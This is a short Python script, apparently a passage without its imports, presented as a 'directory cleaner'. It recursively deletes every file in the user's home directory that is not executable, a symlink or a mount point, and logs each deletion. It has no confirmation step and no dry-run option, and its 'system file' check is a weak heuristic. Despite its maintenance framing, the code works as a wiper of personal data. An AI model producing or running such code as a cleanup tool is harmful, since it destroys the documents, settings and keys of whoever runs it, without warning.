# Set up logging configuration
logging.basicConfig(filename='directory_cleaner.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def is_system_file(file_path):
    """Check if a file is a system file."""
    return os.access(file_path, os.X_OK) or os.path.islink(file_path) or os.path.ismount(file_path)

def prune_directory(directory):
    """Recursively prune the directory and its contents."""
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isdir(item_path):
            prune_directory(item_path)
        elif not is_system_file(item_path):
            try:
                os.remove(item_path)
                logging.info(f"Deleted file: {item_path}")
            except Exception as e:
                logging.error(f"Error deleting file: {item_path}. Error: {e}")

def main():
    user_directory = os.path.expanduser('~')  # Get the user's home directory
    prune_directory(user_directory)

if __name__ == "__main__":
    main()
